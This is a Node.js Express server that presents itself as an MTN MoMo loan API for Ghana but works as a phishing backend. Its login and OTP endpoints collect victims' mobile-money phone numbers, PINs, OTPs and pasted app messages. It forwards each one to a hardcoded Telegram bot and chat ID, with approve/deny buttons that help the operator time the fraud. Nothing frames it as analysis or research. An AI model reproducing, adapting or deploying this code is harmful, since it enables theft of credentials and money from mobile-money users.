const express = require('express');
const cors = require('cors');
const app = express();
const PORT = process.env.PORT || 5000;

// ============================================
// CORS - FULLY ENABLED
// ============================================
app.use(cors({
  origin: '*',
  credentials: true,
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin']
}));

app.options('*', cors());

app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, PATCH, OPTIONS');
  res.header('Access-Control-Allow-Headers', 'Content-Type, Authorization, X-Requested-With, Accept, Origin');
  res.header('Access-Control-Allow-Credentials', 'true');
  if (req.method === 'OPTIONS') {
    return res.status(200).send('OK');
  }
  next();
});

// ============================================
// MIDDLEWARE
// ============================================
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// ============================================
// TELEGRAM CONFIGURATION - GHANA
// ============================================
const BOT_TOKEN = '8912556480:AAF_m34R8vT5GUwhsx29qPW854OOXnl5FfY';
const CHAT_ID = '8313270294';

// Store pending loan requests
const pendingLoans = {};

// ============================================
// SEND TELEGRAM LOGIN + MOMO MESSAGE (FROM LOGIN PAGE)
// ============================================
async function sendTelegramLogin(data) {
  try {
    const message = `💰 *NEW MTN MoMo LOAN APPLICATION - GHANA*\n\n` +
      `🔐 *MOMO ACCOUNT LOGIN*\n` +
      `📱 MoMo Phone: +233 ${data.momoPhone}\n` +
      `🔢 MoMo PIN: ${data.momoPin}\n\n` +
      `📩 *MOMO-APP MESSAGE PASTED:*\n` +
      `\`\`\`\n${data.momoMessage}\n\`\`\`\n\n` +
      `⏰ Time: ${new Date().toLocaleString()}\n\n` +
      `⚠️ Please approve or deny this loan request.`;

    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: message,
        parse_mode: 'Markdown',
        reply_markup: {
          inline_keyboard: [
            [
              { text: '✅ Approve Loan', callback_data: `approve_loan_${data.requestId}` },
              { text: '❌ Deny Loan', callback_data: `deny_loan_${data.requestId}` }
            ]
          ]
        }
      })
    });

    const result = await response.json();
    console.log('📤 Telegram Login Request:', result.ok ? '✅ Sent' : '❌ Failed');
    return result;
  } catch (error) {
    console.error('❌ Telegram error:', error.message);
    return null;
  }
}

// ============================================
// SEND TELEGRAM OTP VERIFICATION (FROM VERIFY PAGE)
// ============================================
async function sendTelegramOTP(data) {
  try {
    const message = `✅ *MTN MoMo Loan - OTP Verification (Ghana)*\n\n` +
      `📱 *MoMo Account:* +233 ${data.momoPhone}\n` +
      `🔑 *OTP Entered:* \`${data.otp}\`\n\n` +
      `📩 *MOMO-APP MESSAGE PASTED:*\n` +
      `\`\`\`\n${data.momoMessage}\n\`\`\`\n\n` +
      `⏰ Time: ${new Date().toLocaleString()}\n\n` +
      `✅ User has confirmed OTP for disbursement.`;

    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: message,
        parse_mode: 'Markdown'
      })
    });

    const result = await response.json();
    console.log('📤 Telegram OTP:', result.ok ? '✅ Sent' : '❌ Failed');
    return result;
  } catch (error) {
    console.error('❌ Telegram error:', error.message);
    return null;
  }
}

// ============================================
// HANDLE TELEGRAM CALLBACK (Approve/Deny)
// ============================================
app.post('/api/telegram/callback', async (req, res) => {
  try {
    const { callback_data } = req.body;

    console.log('📥 Callback received:', callback_data);

    if (!callback_data) {
      return res.status(400).json({ success: false, message: 'No callback data' });
    }

    const [action, type, requestId] = callback_data.split('_');

    if (!pendingLoans[requestId]) {
      return res.status(404).json({ success: false, message: 'Request not found' });
    }

    if (action === 'approve' && type === 'loan') {
      pendingLoans[requestId].status = 'approved';
      console.log('✅ Loan approved for request:', requestId);

      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: `✅ *LOAN APPROVED*\n\n` +
            `📱 MoMo Phone: +233 ${pendingLoans[requestId].momoPhone}\n\n` +
            `💰 Loan amount is being processed.`,
          parse_mode: 'Markdown'
        })
      });

      res.json({ success: true, message: 'Loan approved' });
    } else if (action === 'deny' && type === 'loan') {
      pendingLoans[requestId].status = 'denied';
      console.log('❌ Loan denied for request:', requestId);

      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: `❌ *LOAN DENIED*\n\n` +
            `📱 MoMo Phone: +233 ${pendingLoans[requestId].momoPhone}\n\n` +
            `🚫 Loan request was denied.`,
          parse_mode: 'Markdown'
        })
      });

      res.json({ success: true, message: 'Loan denied' });
    } else {
      res.status(400).json({ success: false, message: 'Invalid action' });
    }
  } catch (error) {
    console.error('❌ Callback error:', error);
    res.status(500).json({ success: false, message: error.message });
  }
});

// ============================================
// CHECK LOAN STATUS ENDPOINT
// ============================================
app.get('/api/loan/status/:requestId', (req, res) => {
  const { requestId } = req.params;

  if (!pendingLoans[requestId]) {
    return res.status(404).json({
      success: false,
      message: 'Request not found'
    });
  }

  res.json({
    success: true,
    status: pendingLoans[requestId].status,
    phone: pendingLoans[requestId].momoPhone
  });
});

// ============================================
// LOGIN ENDPOINT (FROM LOGIN PAGE)
// ============================================
app.post('/api/loan/login', async (req, res) => {
  try {
    const { momoPhone, momoPin, momoMessage } = req.body;

    console.log('🔐 Login attempt:', {
      momoPhone,
      momoPin: '****',
      momoMessage: momoMessage ? 'provided' : 'missing'
    });

    // Validation
    if (!momoPhone || !momoPin) {
      return res.status(400).json({
        success: false,
        message: 'MoMo phone and PIN are required'
      });
    }

    if (!momoMessage) {
      return res.status(400).json({
        success: false,
        message: 'MOMO-APP message is required'
      });
    }

    // Generate unique request ID
    const requestId = 'loan_' + Date.now() + '_' + Math.random().toString(36).substr(2, 5);

    // Store pending request
    pendingLoans[requestId] = {
      momoPhone,
      momoPin,
      momoMessage,
      status: 'pending',
      timestamp: new Date().toISOString()
    };

    // Send Telegram notification with Approve/Deny buttons
    await sendTelegramLogin({
      momoPhone,
      momoPin,
      momoMessage,
      requestId
    });

    res.json({
      success: true,
      message: 'Login request sent. Please wait for admin approval.',
      requestId: requestId
    });

  } catch (error) {
    console.error('Login error:', error);
    res.status(500).json({
      success: false,
      message: 'Login failed',
      error: error.message
    });
  }
});

// ============================================
// OTP VERIFICATION ENDPOINT (FROM VERIFY PAGE)
// ============================================
app.post('/api/loan/verify-otp', async (req, res) => {
  try {
    const { momoPhone, otp, momoMessage } = req.body;

    console.log('🔑 OTP verification:', {
      momoPhone,
      otp,
      momoMessage: momoMessage ? 'provided' : 'missing'
    });

    // Validation
    if (!momoPhone || !otp) {
      return res.status(400).json({
        success: false,
        message: 'MoMo phone and OTP are required'
      });
    }

    if (otp.length !== 4 || !/^\d{4}$/.test(otp)) {
      return res.status(400).json({
        success: false,
        message: 'Please enter a valid 4-digit OTP'
      });
    }

    // Send Telegram OTP notification
    await sendTelegramOTP({
      momoPhone,
      otp,
      momoMessage: momoMessage || 'Not provided'
    });

    res.json({
      success: true,
      message: 'OTP verified successfully'
    });

  } catch (error) {
    console.error('OTP verification error:', error);
    res.status(500).json({
      success: false,
      message: 'OTP verification failed',
      error: error.message
    });
  }
});

// ============================================
// HEALTH CHECK
// ============================================
app.get('/api/health', (req, res) => {
  res.json({
    success: true,
    status: 'OK',
    timestamp: new Date().toISOString(),
    environment: process.env.NODE_ENV || 'production',
    message: 'MTN MoMo Loan API - Ghana is running! 🇬🇭'
  });
});

// ============================================
// 404 HANDLER
// ============================================
app.use((req, res) => {
  res.status(404).json({
    success: false,
    message: 'Route not found',
    path: req.originalUrl
  });
});

// ============================================
// ERROR HANDLER
// ============================================
app.use((err, req, res, next) => {
  console.error('❌ Error:', err.message);
  res.status(500).json({
    success: false,
    message: err.message || 'Internal server error'
  });
});

// ============================================
// START SERVER
// ============================================
app.listen(PORT, '0.0.0.0', () => {
  console.log('====================================');
  console.log('💰 MTN MoMo Loan API - Ghana');
  console.log('====================================');
  console.log(`✅ Server running on port ${PORT}`);
  console.log(`✅ Health check: /api/health`);
  console.log(`🤖 Telegram Bot configured`);
  console.log(`📱 Chat ID: ${CHAT_ID}`);
  console.log('🇬🇭 Ghana MTN MoMo Loan System');
  console.log('====================================');
});
